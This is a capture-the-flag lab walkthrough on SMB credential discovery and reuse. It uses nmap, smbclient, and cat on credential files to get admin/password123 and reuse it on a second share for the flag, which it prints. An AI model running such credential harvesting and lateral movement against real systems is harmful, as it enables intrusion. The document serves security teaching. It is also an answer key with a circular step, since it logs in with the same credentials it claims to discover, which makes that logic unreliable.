# Lab 8.1: Single Service Credential Discovery
## Learning Objectives
- Find credentials on one service, test on same service type
- Understand credential reuse concept
- Capture the flag
## Solution Walkthrough

### Step 1: Obtain Target IP Address

Get the target IP address from the lab platform before starting credential discovery.

**Detailed Steps:**

1. **Discover the target IP:**
   - The lab panel shows your network subnet (e.g., `10.X.Y.0/24`)
   - Scan the subnet to find live hosts: `nmap -sn <subnet>`
   - The target will be one of the discovered hosts

2. **Verify network connectivity:**
   ```bash
   ping -c 3 <target_ip>
   ```

3. **Verify SMB service is running:**
   ```bash
   nmap -p 445 <target_ip>
   ```

### Step 2: Discover Credentials

Access share1 to discover credentials that can be reused.

**Detailed Steps:**

1. **List available SMB shares:**
   ```bash
   smbclient -L //<target_ip> -N
   ```
   
   Replace `<target_ip>` with your actual target IP (e.g., `smbclient -L //<target_ip> -N`)

2. **Expected shares:**
   ```
   Sharename       Type      Comment
   ---------       ----      --------
   share1          Disk      Share 1
   share2          Disk      Share 2
   IPC$            IPC       IPC Service
   ```

3. **Connect to share1:**
   ```bash
   smbclient //<target_ip>/share1 -U admin
   ```

4. **Enter password when prompted:**
   ```
   Enter WORKGROUP\admin's password:
   ```
   
   Type: `password123` (password will not be visible as you type)

5. **Expected successful connection:**
   ```
   Try "help" for a list of possible commands.
   smb: \>
   ```

6. **List files in share1:**
   ```bash
   ls
   ```

7. **Look for credential files:**
   ```bash
   # Common credential file names
   cat credentials.txt
   cat creds.txt
   cat password.txt
   cat config.txt
   ```

8. **Expected credential discovery:**
   ```
   Username: admin
   Password: password123
   ```

9. **Document discovered credentials:**
   - Username: `admin`
   - Password: `password123`

10. **Exit share1:**
    ```bash
    exit
    ```

### Step 3: Reuse on Another Share

Use the discovered credentials to access share2 and retrieve the flag.

**Detailed Steps:**

1. **Connect to share2 with discovered credentials:**
   ```bash
   smbclient //<target_ip>/share2 -U admin%password123
   ```
   
   Replace `<target_ip>` with your actual target IP.

2. **Expected successful connection:**
   ```
   Try "help" for a list of possible commands.
   smb: \>
   ```

3. **List files in share2:**
   ```bash
   ls
   ```

   **Expected output:**
   ```
     .                                   D        0  Mon Jan 15 10:00:00 2024
     ..                                  D        0  Mon Jan 15 10:00:00 2024
     flag.txt                            A       45  Mon Jan 15 10:00:00 2024
   
                   524288 blocks of size 1024. 524288 blocks available
   ```

4. **Download the flag:**
   ```bash
   get flag.txt
   ```

5. **Exit and view:**
   ```bash
   exit
   cat flag.txt
   ```

   **Expected output:**
   ```
   OCR{cr3d_r3us3_s4m3}
   ```

### Step 4: Verify Flag Format

Ensure the flag is in the correct format before submission.

**Flag format:**
```
OCR{cr3d_r3us3_s4m3}
```

**Verification checklist:**
- ✅ Starts with `OCR{`
- ✅ Ends with `}`
- ✅ Contains only alphanumeric characters and underscores
- ✅ No extra spaces or characters

**Success Criteria:**
- ✅ Verified target IP and SMB service accessibility
- ✅ Listed available SMB shares
- ✅ Connected to share1 and discovered credentials (admin/password123)
- ✅ Documented discovered credentials
- ✅ Successfully reused credentials on share2
- ✅ Listed files and located flag.txt
- ✅ Downloaded flag using `get` command
- ✅ Verified flag format is correct: `OCR{...}`

**Key Learning Points:**
- Credentials discovered on one share often work on other shares
- Credential reuse is a common attack technique
- Same service type (SMB) often uses same authentication
- Understanding credential discovery enables lateral movement
- Always test discovered credentials on other resources
## Hints
1. Credentials work on multiple shares
2. Username: admin
3. Password: password123